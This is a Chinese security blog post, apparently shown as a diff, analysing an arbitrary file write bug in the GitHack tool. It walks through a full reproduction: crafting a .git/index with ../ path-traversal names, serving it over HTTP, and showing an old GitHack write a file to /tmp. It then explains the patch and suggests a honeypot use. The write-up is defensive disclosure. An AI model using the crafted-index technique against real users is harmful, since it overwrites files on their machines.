@@ -1,0 +1,100 @@
+# 前言
+
+最近几天，关注的lijiejie大佬的GitHack项目提交了commit[1]，Change Log写着Fix abitrary file write
+vulnerability。GitHack任意文件写入漏洞？这里让我们分析一下这个漏洞。
+
+# 漏洞详情
+
+本漏洞最早是由国外安全研究者justinsteven报告的[2]，报告中指出相关软件在使用或访问一些不信任的git仓库的情况下，就可能被精心设计者利用。
+
+GitHack通过gin（一个git的index文件解析）去直接解析.git/index文件，找到工程中所有的文件并下载，当解析到的文件名含有../时，下载的文件就会往上穿越目录存放，遇到同名文件还可以覆盖。只要通过精心的设计的.git/index，就可以把任意文件写入到GitHack工具使用者的机器上。
+
+# 场景复现
+
+首先构造一个Git仓库：
+
+    
+    
+    /# mkdir -p /tmp/test
+    /# cd /tmp/test
+    /tmp/test# git init
+    Initialized empty Git repository in /tmp/test/.git/
+    /tmp/test# echo nothing |tee other1 other2 other3
+    nothing
+    /tmp/test# mkdir -p aabaabaabaabaabaabaabaabaabtmp
+    /tmp/test# echo "flag{gamelab}" >> aabaabaabaabaabaabaabaabaabtmp/gamelab
+    /tmp/test# git add .
+    /tmp/test# git commit -m "add gamelab"
+    [master (root-commit) 97d7] add gamelab
+     4 files changed, 4 insertions(+)
+     create mode 100644 aabaabaabaabaabaabaabaabaabtmp/gamelab
+     create mode 100644 other1
+     create mode 100644 other2
+     create mode 100644 other3
+    root@cn:/tmp/test# strings .git/index |grep gamelab
+    &aabaabaabaabaabaabaabaabaabtmp/gamelab
+
+再使用sed替换字符串：
+
+    
+    
+    /tmp/test# sed -i 's#aab#../#g' .git/index
+    /tmp/test# strings .git/index |grep gamelab
+    &../../../../../../../../../tmp/gamelab
+    
+
+使用python开启HTTP服务，让我们可以通过HTTP来访问当前文件夹的/.git目录。
+
+    
+    
+    /tmp/test# python2 -m SimpleHTTPServer 2333
+    Serving HTTP on 0.0.0.0 port 2333 ...
+    
+
+到这里，准备工作就做好了。
+
+打开另一个终端，使用旧版Githack直接获取泄露的.git文件夹。
+
+    
+    
+    /tmp/old# cat /tmp/gamelab
+    cat: /tmp/gamelab: No such file or directory
+    /tmp/old# python2 GitHack.py http://127.0.0.1:2333/.git/
+    [+] Download and parse index file ...
+    ../../../../../../../../../tmp/gamelab
+    other1
+    other2
+    other3
+    [OK] ../../../../../../../../../tmp/gamelab
+    [OK] other1
+    [OK] other2
+    [OK] other3
+    /tmp/old# cat /tmp/gamelab
+    flag{gamelab}
+    
+
+至此，文件已写入。
+
+# 修复方案
+
+让我们先来看一下GitHack源码都有哪些修改：
+
+![](https://image.3001.net/images/20220413/1649828693_6256635586c306a8eea81.png!small)
+
+最大的改动是在此处加了一个判断 if entry["name"].strip().find('..') <
+0:，也就是说如果entry["name"]内没有..，则操作与以前一样，修复后，..就被限制住了。
+
+所以，现在就去更新下你的GitHack工具到2022.4.7最新版。
+
+此外，王一航的GitHacker项目已于2022.3.1修复该漏洞[3]。
+
+# 随想
+
+旧版GitHack这个漏洞存在已久，通过精心设计，可以有效地反制使用者。该环境也可以存在于蜜罐中，作为诱饵来诱捕攻击者。建议各位师傅更新下GitHack。
+
+# 参考链接
+
+  1. https://github.com/lijiejie/GitHack
+  2. https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md
+  3. https://github.com/WangYihang/GitHacker
+
